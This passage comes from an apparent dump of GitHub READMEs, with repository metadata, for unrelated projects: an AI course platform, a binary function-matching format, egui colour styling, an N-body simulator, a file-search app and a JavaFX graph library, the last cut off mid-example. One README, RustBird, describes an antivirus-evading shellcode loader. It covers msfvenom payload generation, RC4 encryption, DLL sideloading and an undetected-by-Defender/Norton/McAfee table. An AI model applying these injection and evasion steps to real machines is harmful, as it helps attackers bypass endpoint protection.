  * [The Rustonomicon](https://doc.rust-lang.org/nomicon/index.html)
  * [The Rust Unstable Book](https://doc.rust-lang.org/nightly/unstable-book/index.html)

## How To Contribute

Contributions are always welcome, either reporting issues/bugs or forking the repository and then issuing pull requests when you have completed some additional coding that you feel will be beneficial to the main project. If you are interested in contributing in a more dedicated capacity, then please contact me.

## Contact

You can contact me via e-mail (utilForever at gmail.com). I am always happy to answer questions or help with any issues you might have, and please be sure to share any additional work or your creations with me, I love seeing what other people are making.

## License

<img align=""right"" src=""https://149753425.v2.pressablecdn.com/wp-content/uploads/2009/06/OSIApproved_100X125.png"">

The class is licensed under the [MIT License](http://opensource.org/licenses/MIT):

Copyright &copy; 2024 [Chris Ohk](http://www.github.com/utilForever).

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
",0,0,1,MIT,,0.0
taoofagi/easegen-admin,main,"
<p align=""center"">
  <a href=""./README.md"">English</a> |
  <a href=""./README_cn.md"">ÁÆÄ‰Ωì‰∏≠Êñá</a> 
</p>

I am a full-stack engineer, a practitioner of the AGI era super individual, hoping to contribute to AI development through open source.

If this project has helped you, remember to Star and follow, which would be great encouragement and support for me.

## üê∂ Beginner's Guide

* Demo URL „ÄêVue3 + element-plus„Äë: <http://36.103.251.108:48083> Please register to try it yourself.
* Startup documentation, operation manual: Please join the discard group to get it.
discard:https://discord.gg/q2RK3sEQwW
* Project collaboration & technical exchanges: add WeChat, note easegen:
![WeChat](.image%2Fdigitalcourse%2Fwechat.png)

## üêØ Platform Introduction

**easegen**, an open-source digital human course creation platform.

* Frontend is implemented based on [yudao-ui-admin-vue3](https://gitee.com/yudaocode/yudao-ui-admin-vue3).
* Backend is implemented based on [ruoyi-vue-pro](https://gitee.com/zhijiantianya/ruoyi-vue-pro).
* Intelligent courseware is realized based on [Wenduoduo AIPPT](https://easegen.docmee.cn).

* Course creation page

![digitalhuman_course.png](.image%2Fdigitalcourse%2Fdigitalhuman_course.gif)

* Intelligent Courseware

![aippt.png](.image%2Fdigitalcourse%2Faippt.gif)
* Intelligent Test Creation

![ai_gen_test.png](.image%2Fdigitalcourse%2Fai_gen_test.gif)

*  [Sample Course](https://www.bilibili.com/video/av113088116297160/)

[![Bilibili Video](.image%2Fdigitalcourse%2Fdemo_course.png)](https://www.bilibili.com/video/av113088116297160/)

## üó∫Ô∏è Development Roadmap

Here are the major features and improvements we plan to implement in the future:
- [x] Support for course templates
- [x] Support for intelligent script generation
- [ ] Support for digital human image and voice customization
- [x] Support for docker quick deployment
- [ ] SSML syntax support for voice
- [ ] Adding lesson plan generation
- [ ] Convert lesson plans to courseware and generate controllable PPTs
- [ ] Support for real-time digital human teaching
- [ ] Adding an intelligent assistant

## Technology Stack

Refer to [yudao-framework](https://gitee.com/zhijiantianya/ruoyi-vue-pro)
Developed based on the master-jdk17 branch.

## Deployment Manual
https://ozij45g3ts.feishu.cn/docx/EgS3dm1HtoKOPkxReEQcn3MCncg

## üî• Frontend Code

‚ë† easegen-frontÔºö<https://github.com/taoofagi/easegen-front>

### Additional Features
Refer to [ruoyi-vue-pro](https://gitee.com/zhijiantianya/ruoyi-vue-pro#-%E5%86%85%E7%BD%AE%E5%8A%9F%E8%83%BD)

## üåü Star History

[![Star History Chart](https://api.star-history.com/svg?repos=taoofagi/easegen-admin&type=Date)](https://star-history.com/#taoofagi/easegen-admin&Date)

## ü§ù Awards
1. [2024 Huacai Cup Compute Power Competition Finals Second Prize, Project No. L01610474065](https://mp.weixin.qq.com/s/SE10-cxLVurf0BfAMaegmw)]

## üßæ Disclaimer/License

1. `Code`: The `easegen-admin` code is released under the `Apache` license for academic and commercial use.
2. `AIGC`: This project aims to positively impact the AI-generated text, speech, and video field. Users are granted the freedom to use this tool to create text, speech, and videos, but they should comply with local laws and use it responsibly. Developers bear no responsibility for any misuse of the tool by users.
",0,0,1,MIT,,0.0
c2pain/RustBird,main,"# RustBird (Early Bird APC Injection in Rust)

<p align=""left"">
	<a href=""https://www.rust-lang.org/""><img src=""https://img.shields.io/badge/made%20with-Rust-red""></a>
	<a href=""#""><img src=""https://img.shields.io/badge/platform-windows-blueviolet""></a>
</p>

![rustbird](https://static.wikia.nocookie.net/finalfantasy/images/9/90/Rust_Bird_from_FFIII_Pixel_Remaster_sprite.png)

## Overview
The technique known as ""Early Bird APC Injection"" is used to inject malicious code into the legitimate processes of a Windows operating system. This method inserts malicious code into a process during its early stages, often before the main routines of the process are activated. It also features enhanced antivirus evasion capabilities through the implementation of a Block DLL Policy, which prevents the loading of DLLs not signed by Microsoft, the use of Zw* functions from undocumented APIs in the Windows Kernel, and the utilization of DLL sideloading.

## Generate Payload using MSFvenom
```
msfvenom -p windows/x64/exec cmd=""calc.exe"" -f raw -o raw.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 276 bytes
Saved as: raw.bin
```

## Payload Encryption
RC4 Encrypt Payload: https://github.com/c2pain/RC4_Encryptor

Example:
```
C:\Users\C2Pain\Desktop> rc4_encryptor.exe raw.bin
[+] Encrypted shellcode saved to: r-a-w-4.enc
```

## DLL Sideloading
Using Dism.exe as an example, it has been noted that it loads DismCore.dll.

To locate the exported functions, you can use: https://github.com/c2pain/RustGetExports

You can then include the exported functions to the lib.rs.
```
RustGetExports.exe C:\Windows\System32\Dism\DismCore.dll
DismCore.dll
DllCanUnloadNow
DllGetClassObject
DllRegisterServer
```

## Usage 
You need to compiled the binary and copy C:\Windows\System32\Dism.exe to the same directory to run:
```
cargo build --release
```

## AV/EDR Testing Result on x64 Windows 10/11
Test Date: 5 Oct 2024
| AV/EDR Product | Execute |
| ------ | ------ |
| Microsoft Defender | :white_check_mark: |
| Norton 360 Deluxe | :white_check_mark: |
| McAfee | :white_check_mark: |

## Screenshots
![spawn-calc](/screenshots/spawn-calc.png)

## Reference and Credits
[RustRedOps](https://github.com/joaoviictorti/RustRedOps) by @joaoviictorti

[Hijack Execution Flow: DLL Side-Loading](https://attack.mitre.org/techniques/T1574/002/)

[Final Fantasy Wiki - Enemies in Final Fantasy III](https://finalfantasy.fandom.com/wiki/Rust_Bird)

## Full Disclaimer
For educational purposes only. Any actions and or activities related to the material contained within this repository is solely your responsibility. The misuse of the tools in this repo could result in criminal charges being brought against the persons in question. The author will not be held responsible in the event any criminal charges are brought against any individuals misusing the tools in this repository for mailicious ourposes or to break the law.

## Support
BTC: bc1q6segt3zsy0q7656ktcf8kgulday0as27xtpffx

[![""Buy Me A Coffee""](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/c2pain)
",0,0,1,,,0.0
Vector35/warp,master,"# WARP

**WARP** provides a common format for transferring and applying function information across binary analysis tools.

## WARP Integrations

### Binary Ninja

WARP integration is available as an [open source](https://github.com/Vector35/binaryninja-api/tree/dev/plugins/warp) first-party plugin for [Binary Ninja] and as such ships by default.

## Function Identification

Function identification is the main way to interact with **WARP**, allowing tooling to utilize **WARP**'s dataset to identify
common functions within any binary efficiently and accurately.

### Integration Requirements

To integrate with **WARP** function matching you must be able to:

1. Disassemble instructions
2. Identify basic blocks that make up a function
3. Identify register groups with implicit extend operation
4. Identify relocatable instructions (see [What is considered a relocatable operand?](#what-is-considered-a-relocatable-operand))

### Creating a Function GUID

The function GUID is the UUIDv5 of the basic block GUID's (sorted highest to lowest start address) that make up the function.

#### Example

Given the following sorted basic blocks:

1. `036cccf0-8239-5b84-a811-60efc2d7eeb0`
2. `3ed5c023-658d-5511-9710-40814f31af50`
3. `8a076c92-0ba0-540d-b724-7fd5838da9df`

The function GUID will be `7a55be03-76b7-5cb5-bae9-4edcf47795ac`.

##### Example Code

```py
import uuid

def uuid5(namespace, name_bytes):
  """"""Generate a UUID from the SHA-1 hash of a namespace UUID and a name bytes.""""""
  from hashlib import sha1
  hash = sha1(namespace.bytes + name_bytes).digest()
  return uuid.UUID(bytes=hash[:16], version=5)

function_namespace = uuid.UUID('0192a179-61ac-7cef-88ed-012296e9492f')
bb1 = uuid.UUID(""036cccf0-8239-5b84-a811-60efc2d7eeb0"")
bb2 = uuid.UUID(""3ed5c023-658d-5511-9710-40814f31af50"")
bb3 = uuid.UUID(""8a076c92-0ba0-540d-b724-7fd5838da9df"")
function = uuid5(function_namespace, bb1.bytes + bb2.bytes + bb3.bytes)
```

#### What is the UUIDv5 namespace?

The namespace for Function GUID's is `0192a179-61ac-7cef-88ed-012296e9492f`.

### Creating a Basic Block GUID

The basic block GUID is the UUIDv5 of the byte sequence of the instructions (sorted in execution order) with the following properties:

1. Zero out all instructions containing a relocatable operand.
2. Exclude all NOP instructions.
3. Exclude all instructions that set a register to itself if they are effectively NOPs.

#### When are instructions that set a register to itself removed?

To support hot-patching we must remove them as they can be injected by the compiler at the start of a function (see: [1] and [2]).
This does not affect the accuracy of the function GUID as they are only removed when the instruction is a NOP:

- Register groups with no implicit extension will be removed (see: [3] (under 3.4.1.1))

For the `x86_64` architecture this means `mov edi, edi` will _not_ be removed, but it _will_ be removed for the `x86` architecture.

#### What is considered a relocatable operand?

An operand that is used as a pointer to a mapped region.

For the `x86` architecture the instruction `e8b55b0100` (or `call 0x15bba`) would be zeroed.

#### What is the UUIDv5 namespace?

The namespace for Basic Block GUID's is `0192a178-7a5f-7936-8653-3cbaa7d6afe7`.

### Function Constraints

Function constraints allow us to further disambiguate between functions with the same GUID, when creating the functions we store information about the following:

- Called functions
- Caller functions
- Adjacent functions

Each entry in the lists above is referred to as a ""constraint"" that can be used to further reduce the number of matches for a given function GUID.

##### Why don't we require matching on constraints for trivial functions?

The decision to match on constraints is left to the user. While requiring constraint matching for functions
from all datasets can reduce false positives, it may not always be necessary. For example, when transferring functions
from one version of a binary to another version of the same binary, not matching on constraints for trivial functions
might be acceptable.

## Comparison of Function Recognition Tools

### WARP vs FLIRT

The main difference between **WARP** and **FLIRT** is the approach to identification.

#### Function Identification

- **WARP** the function identification is described [here](#function-identification).
- **FLIRT** uses incomplete function byte sequence with a mask where there is a single function entry (see: [IDA FLIRT Documentation] for a full description).

What this means in practice is **WARP** will have less false positives based solely off the initial function identification.
When the returned set of functions is greater than one, we can use the list of [Function Constraints](#function-constraints) to select the best possible match.
However, that comes at the cost of requiring a computed GUID to be created whenever the lookup is requested and that the function GUID is _**always**_ the same.


[1]: https://devblogs.microsoft.com/oldnewthing/20110921-00/?p=9583
[2]: https://devblogs.microsoft.com/oldnewthing/20221109-00/?p=107373
[3]: https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-vol-1-manual.pdf
[IDA FLIRT Documentation]: https://docs.hex-rays.com/user-guide/signatures/flirt/ida-f.l.i.r.t.-technology-in-depth
[Binary Ninja]: https://binary.ninja
[Binary Ninja Integration]: https://github.com/Vector35/binaryninja-api/tree/dev/plugins/warp",0,16,6,NOASSERTION,CI.yaml,1.0
frankvgompel/egui_colors,master,"# egui_colors

Experimental toolkit to explore color styling in [`egui`](https://github.com/emilk/egui)

Based on the [`Radix`](https://www.radix-ui.com/colors/docs/palette-composition/understanding-the-scale) 
system, which defines 12 functional UI elements, and maps them to a color scale. 

Scales (both light and dark mode) are computed and based on luminosity contrast algorithm defined by [`APCA`](https://github.com/Myndex). Every scale uses one predefined [u8; 3] rgb color that is used as an accent color (if suitable).

![example_image](media/egui_colors_v0.5.0.png)
![example_image](media/egui_colors_light.png)


## General Remarks

Although it is perfectly possible to use egui_colors to style your egui app, it's intended use is to explore the styling landscape and see
where Egui's and users needs lie. It is also possible to extend the basis to other GUI libraries such as `Xilem` or `MakePad` if there is interest.

Several observations I made: 

1) The default egui font seems not entirely suited (too thin) for the radix system. The example uses the Rerun one: 'inter_medium'.

2) One scale doesn't seem sufficient for styling an entire app. For instance, I didn't touch the `error` or `warn` colors. Neither any `alpha` components (such as shadows).


## Usage


Basic setting of theme.

```rust
use egui_color::{Colorix; ThemeColor};

// Define a colorix field in your egui App
#[derive(Default)]
struct App {
    colorix: Colorix,
    ...
}
// Choose a light or dark theme.
// initialize the Colorix with a theme
// A `ThemeColor` is an enum with several preset colors and one Custom.
impl App {
    fn new(ctx: &egui::Context) -> Self {
        ctx.set_theme(egui::Theme::Dark);
        let yellow_theme = [ThemeColor::Custom([232, 210, 7]); 12]
        let colorix = Colorix::init(ctx, yellow_theme);
        Self {
            colorix,
            ..Default::default()
        }
    }
}
```

Several utility tools are available.
```rust
// use the provided function 'light_dark_toggle_button' for switching between light and dark mode. If you use one from egui, it will revert to the egui theme.
app.colorix.light_dark_toggle_button(ctx, ui);

// A color picker for a custom color. 
// NOTE: the color picker is clamped to suitable ranges. 
// If the selected color's contrast is not sufficient, it will be replaced by a more saturated version.
app.colorix.custom_picker(ui);
// A helper to select the 12 elements and functionality to copy theme to clipboard
app.colorix.ui_combo_12(ctx, ui);

// dropdown with themes. It is possible to add custom themes to the list 
// with an Option<(Vec<&str>, Vec<[ThemeColor; 12]>)>
let names = vec![""YellowGreen""];
let themes = vec![[ThemeColor::Custom([178, 194, 31]); 12]];
let custom = Some((names, themes));

// if you want to display custom themes only, set bool to `true`
app.colorix.themes_dropdown(ctx, ui, custom, false);

// Possibility to use a background gradient. 
app.colorix.draw_background(ctx, false);

```

## Examples
See the example [`hello_colors`](https://github.com/frankvgompel/egui_colors/tree/master/examples/hello_colors)

Another [`example`](https://github.com/crumblingstatue/mpv-egui-musicplayer/commit/2e77b7f7c729f7fd55e652f78826e1f417ad3eaa) from an experienced user how to set up [`egui_colors`](https://github.com/frankvgompel/egui_colors)",4,0,1,MIT,ci.yml,8.0
DeadlockCode/barnes-hut,master,"# Barnes-Hut
This is the official repository for the code shown in [How to make HUGE N-Body Simulations (N=1,000,000+)](https://youtu.be/nZHjD3cI-EU)

This repository consists of three branches:
1. [The master branch](https://github.com/DeadlockCode/barnes-hut).
    
    This is the code shown in the video and is my (mostly) faithful implementation of the original algorithm as described in the Barnes-Hut paper.
2. [The improved branch](https://github.com/DeadlockCode/barnes-hut/tree/improved).
    
    This modifies the original algorithm by a) storing the nodes in a cache friendly order and b) allowing multiple bodies to inhabit the same leaf node.
3. [The parallel branch](https://github.com/DeadlockCode/barnes-hut/tree/parallel).
    
    This is a crude attempt at parallelizing the improved branch to show its potential.

## Guide
1. Install [Rust](https://www.rust-lang.org/tools/install)
2. Clone the repository
3. If you're **not** on Windows, follow [this](https://github.com/DeadlockCode/n-body/issues/1)
4. Checkout the desired branch
5. Open the folder in a terminal
6. Run 'cargo run --release'
7. Enjoy

## Controls
- Scroll to zoom
- Middle mouse button to grab view
- Right mouse button to spawn a body
- To change the mass of the body, wind the mouse around it while holding right click
- Space to pause/continue
- E to open a menu where you can enable the quadtree visualization
",0,2,3,Apache-2.0,,5.0
luleyleo/clapgrep,main,"# Clapgrep

One app to search through all your files

[![Get it on Flathub](https://flathub.org/api/badge?svg&locale=en)](https://flathub.org/apps/de.leopoldluley.Clapgrep)

## Description

Ever had a folder full of PDF files, where you knew, somewhere in there, is what you're looking for. But you did not know in which file. So you had to search each of them at a time...

With Clapgrep this is no longer necessary! Simply open the folder with Clapgrep, enter the search term, and Clapgrep will do all the hard work of finding out on which page / line in which file the information is that you are looking for!

Clapgrep can currently search all sorts of text files, PDFs and Office documents, with more to come.

![screenshot of the app](assets/screenshot-1.png)

## Contributing

See [Contributing](/CONTRIBUTING.md).
",5,14,2,GPL-3.0,ci.yaml,27.0
vittorioPiotti/PathGraph-JavaFX,main,"# (Java FX) PathGraph







<img src=""https://github.com/vittorioPiotti/PathGraph-ForkBased/blob/master/github/sp.gif"" alt=""Icona"" width=""400""/>


**What is PathGraph**

Path Graph is a library with all the tools necessary to create and work both path and walk graphs in a stable and simple way.

**Why PathGraph**

If you need a ready-to-use library for user-side representing path graphs in which there are nodes, edges, and associated costs, which offers a user-friendly  to represent, manage, and interact graphs, then this it's the right solution. 


**Fork-Based Project**

This library is a fork based on the source code of the [SmartGraph](https://github.com/brunomnsilva/JavaFXSmartGraph) [v2.0.0](https://github.com/brunomnsilva/JavaFXSmartGraph/releases/tag/v2.0.0). It is modified to suite in specific path graphs features in a stable interface.

---


> [!NOTE]
> Read the **Javadoc** for more details: [`PathGraph-JavaFX-1.0.9-javadoc`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/spring-core)


> [!NOTE]
> Library available on **Maven Central:** [`PathGraph-JavaFX-1.0.9`](https://central.sonatype.com/artifact/io.github.vittoriopiotti/PathGraph-JavaFX/1.0.9/overview)
> ```xml
> <dependency>
>   <groupId>io.github.vittoriopiotti</groupId>
>   <artifactId>PathGraph-JavaFX</artifactId>
>   <version>1.0.9</version>
> </dependency>
> ```

## Index

 1. [Features](#features)
 2. [Graph Logic](#graph-logic)
 3. [Get Started](#get-started)
 4. [Ready to Code](#ready-to-code)
 5. [Examples](#examples)
 6. [Callbacks](#callbacks)
 7. [DTO ¬∑ Data Transfer Object](#data-transfer-object)
 8. [JSON ¬∑ Data Management](#json-data-management)
 9. [Configuration and Styling](#configurations-and-styling)
 10. [Licenses](#licenses)

[_Fork-Based On SmartGraph_](#fork-based-on-smartgraph)



---







## 1. Features <div id=""features""/>



| <img src=""https://github.com/vittorioPiotti/PathGraph-ForkBased/blob/master/github/clickBackground.gif"" alt=""Icona"" width=""100%""/> | <img src=""https://github.com/vittorioPiotti/PathGraph-ForkBased/blob/master/github/test7ui.gif"" alt=""Icona"" width=""100%""/> | <img src=""https://github.com/vittorioPiotti/PathGraph-ForkBased/blob/master/github/test8ui.gif"" alt=""Icona"" width=""100%""/>|
| ------------ | ------------ | ------------ |
| <img src=""https://github.com/vittorioPiotti/PathGraph-ForkBased/blob/master/github/test5ui.gif"" alt=""Icona"" width=""100%""/> | <img src=""https://github.com/vittorioPiotti/PathGraph-ForkBased/blob/master/github/test1ui.gif"" alt=""Icona"" width=""100%""/> | <img src=""https://github.com/vittorioPiotti/PathGraph-ForkBased/blob/master/github/test4ui.gif"" alt=""Icona"" width=""100%""/>|

 * **Nodes:** [`New Node`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#newNode()), [`Rename Node`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#renameNode(char,char)), [`Delete Node`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#deleteNode(char))
   
 * **Edges:** [`New Edge`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#newEdge()), [`Delete Edge`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#deleteEdge(char)), [`Rotate Edge`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#rotateEdge(char,char)), [`Split Edge`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#splitEdge(char,char)), [`Set Cost`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#setCost(char,char,int))
   
 * **Graph:** [`Upload JSON`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#uploadJSON(java.io.File)), [`Download JSON`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#downloadJSON(java.io.File)), [`Clear Graph`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#clearGraph()), [`Show Path`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#showPath(java.util.List)), [`Take Screenshot`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#takeScreenshot()), [`Drag`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#doDrag()), [`Zoom`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#doZoom()), [`Adjust Position`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#adjustPosition(double))

 * **UI:** [`Hide UI`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraphUI.html#hideUI()), [`Show UI`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraphUI.html#showUI()), [`Toggle UI`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraphUI.html#toggleUI()), [`Set UI`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraphUI.html#setUI(boolean,boolean,boolean,boolean,boolean,boolean))

 









## 2. Graph Logic <div id=""graph-logic""/>

* Limit of 26 Nodes nameable only with uppercase characters
* Limit of two edges with opposite directions beetween two nodes
* Loop creation is not allowed
* Edge cost is an integer number
* Edge directions can be: [`Bidirectional`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/Constants.html#BIDIRECTIONAL), [`Natural Direction`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/Constants.html#BIDIRECTIONAL), [`Opposite Direction`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/Constants.html#BIDIRECTIONAL)









## 3. Get Started <div id=""get-started""/>

### Requirements


[`Java-21`](https://www.oracle.com/java/technologies/downloads/#java21), [`JavaFX-22`](https://gluonhq.com/products/javafx/)

_Forward-compatible_

### Dependencies

**Import External Dependencies**

[`JavaFX-Swing-22`](https://mvnrepository.com/artifact/org.openjfx/javafx-swing/22), ‚Äã[`JavaFX-Controls-22`](https://mvnrepository.com/artifact/org.openjfx/javafx-controls/22), ‚Äã [`JavaFX-FXML-22`](https://mvnrepository.com/artifact/org.openjfx/javafx-fxml/22)

**Import Library**

[`PathGraph-JavaFX-1.0.9`](https://central.sonatype.com/artifact/io.github.vittoriopiotti/PathGraph-JavaFX/1.0.9/overview)


_Able to:_

 * POM configuration:

   ```xml
   <dependency>
       <groupId>io.github.vittoriopiotti</groupId>
       <artifactId>PathGraph-JavaFX</artifactId>
       <version>1.0.9</version>
   </dependency>
   ```

        
 * Manual configuration:
   
   Download and import jar in your module dependencies: [`PathGraph-JavaFX-1.0.9.jar`](https://github.com/vittorioPiotti/PathGraph-JavaFX/releases/tag/1.0.9)



<details>
  
<summary>
   <strong>Show POM.xml dependencies</strong>
</summary>



```xml
<dependency>
    <groupId>io.github.vittoriopiotti</groupId>
    <artifactId>PathGraph-JavaFX</artifactId>
    <version>1.0.9</version>
</dependency>
<dependency>
    <groupId>org.openjfx</groupId>
    <artifactId>javafx-swing</artifactId>
    <version>22</version>
</dependency>
<dependency>
    <groupId>org.openjfx</groupId>
    <artifactId>javafx-controls</artifactId>
    <version>22</version>
</dependency>
<dependency>
    <groupId>org.openjfx</groupId>
    <artifactId>javafx-fxml</artifactId>
    <version>22</version>
</dependency>


```




</details>


## 4. Ready to Code <div id=""ready-to-code""/>

### Import Component

 ```java
 import com.vittoriopiotti.pathgraph.app.*;
 ```

### Instance Object

> [!NOTE]
>  * `PathGraph` to create your custom interface
>  * `PathGraphUI`for ready-to-use interface

**PathGraph**


Vanilla configurations to use in your project in which create your custom UI.


Handles the graph's display and logic independently of the user interface, acting as a standalone component without any user interface restrictions, provifind all necessary features.

```java
PathGraph pg = new PathGraph();
```

> Empty callbacks

_or_



```java
PathGraph pg = new PathGraph(
    (ContextMenuCallback) ()->{},
    (EdgeCallback) (MouseEvent e, Character c1, Character c2)->{},
    (NodeCallback) (MouseEvent e, Character c1, Character c2)->{},
    (BackgroundCallback) (MouseEvent e)->{}, 
    (ZoomCallback) (Double n)->{},
    (AdjustPositionCallback) ()->{}
);
```

> With callbacks





**PathGraphUI**

Ready-to-use configuration with default UI.

Extends PathGraph to provide a layer on top of the graph management functionalities. It allows for the interaction with the graph through a visual interface over the underlying graph logic.


```java
PathGraphUI pg = new PathGraphUI(
    (Stage) stage,
    (Scene) scene
);
```

> With default UI


_or_



```java
PathGraphUI pg = new PathGraphUI(
    (Stage) stage,
    (Scene) scene,
    
    /* is enabled top-left menu */
    true,
    
    /* is enabled bot-left menu */
    true,
    
    /* is enabled bot-mid menu */
    true,
    
    /* is enabled right-mid menu */
    true,
    
    /* is enabled top-right menu */
    true,
    
    /* is hide UI */
    false

);
```

> With custom UI



In both cases are customizable the visibility of the UI and its components only with an instance of `PathGraphUI`:

[`Hide UI`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraphUI.html#hideUI()), [`Show UI`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraphUI.html#showUI()), [`Toggle UI`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraphUI.html#toggleUI()), [`Set UI`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraphUI.html#setUI(boolean,boolean,boolean,boolean,boolean,boolean))


### Setup  <div id=""setup""/>


> [!NOTE]
> **To enable the use of library** `setup` must be called **only one time after making stage visible** with `(Stage) stage.show()`
>
> _Before calling setup, no operations of any kind can be performed on the graph_


```java
pg.setup();
```



_or_



```java
pg.setup().thenRun(() -> {

  /* actions to perform on first load */
  /* e.g. put here components, callbacks setting, graph configurations */

});
```

Graph operations are limited to these contexts:

 * **Setup:** ensures execution post-initialization in `pg.setup().thenRun(()->{})`.
 * **Event Handlers:** Safe within JavaFX event actions.
 * **JavaFX Timers:** Use for delayed, thread-safe execution.


## 5. Examples <div id=""examples""/>


### PathGraph

Vanilla configurations to use in your project in which create your custom UI.



```java
import javafx.application.Application;
import javafx.scene.Scene;
import javafx.stage.Stage;
import javafx.scene.layout.BorderPane;
import com.vittoriopiotti.pathgraph.app.PathGraph;

public class ExampleOfPathGraph extends Application {

    @Override
    public void start(Stage primaryStage) {

        /* 1. Create javafx window */
        BorderPane root = new BorderPane();
        Scene scene = new Scene(root,500,300);
        primaryStage.setScene(scene);

        /* 2. Show primary stage */
        primaryStage.show();

        /* 3. Instance object */
        PathGraph pg = new PathGraph();

        /* 4. Add PathGraph in a container */
        root.setCenter(pg);

        /* 6. Setup */
        pg.setup().thenRun(() -> {

            /* 5. Custom configurations  */
            pg.enableListenersGraph(true);
            pg.enableListenersPane(true);
            pg.setAutomaticLayout(true);

            /* Set callbacks */
            pg.setBackgroundCallback(event -> {
                pg.newNode();
                event.consume();
            });
            pg.setNodeCallback((event,label) -> {
                pg.newEdge(label);
                event.consume();
            });
            pg.setEdgeCallback((event,start,end) -> {
                pg.deleteEdge(start,end);
                event.consume();
            });
            
            /* 7. Make Graphs */
            pg.newNode('A');
            pg.newNode('B');
            pg.newNode('C');
            pg.newEdge('A', 'B', 1);
            pg.newEdge('C', 'A', 2, false);

        });

    }

